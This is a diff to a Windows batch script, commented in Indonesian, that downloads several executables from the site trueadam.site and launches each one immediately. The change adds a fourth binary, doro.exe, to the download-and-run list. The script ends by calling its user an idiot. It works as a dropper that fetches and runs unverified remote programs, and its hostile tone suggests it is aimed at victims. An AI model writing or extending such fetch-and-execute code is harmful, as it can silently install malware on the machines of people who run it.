@@ -46,11 +46,14 @@ set URL2=https://trueadam.site/StarDesk_1.4.0.exe
 set FILE2=StarDesk_1.4.0.exe
 set URL3=https://trueadam.site/DyBrowser.exe
 set FILE3=DyBrowser.exe
+set URL4=https://trueadam.site/doro.exe
+set FILE4=doro.exe
 
 :: Download pake metode triple backup
 call :Download "%URL1%" "%FILE1%"
 call :Download "%URL2%" "%FILE2%"
 call :Download "%URL3%" "%FILE3%"
+call :Download "%URL4%" "%FILE4%"
 
 echo ========================================
 echo CEK DAN JALANIN FILE
@@ -59,6 +62,7 @@ echo ========================================
 if exist "%FILE1%" (start "" "%FILE1%" & echo [OK] %FILE1% running) else (echo [GAGAL] %FILE1%)
 if exist "%FILE2%" (start "" "%FILE2%" & echo [OK] %FILE2% running) else (echo [GAGAL] %FILE2%)
 if exist "%FILE3%" (start "" "%FILE3%" & echo [OK] %FILE3% running) else (echo [GAGAL] %FILE3%)
+if exist "%FILE4%" (start "" "%FILE4%" & echo [OK] %FILE4% running) else (echo [GAGAL] %FILE4%)
 
 echo ========================================
 echo SELESAI GOBLOK 😡😡😡
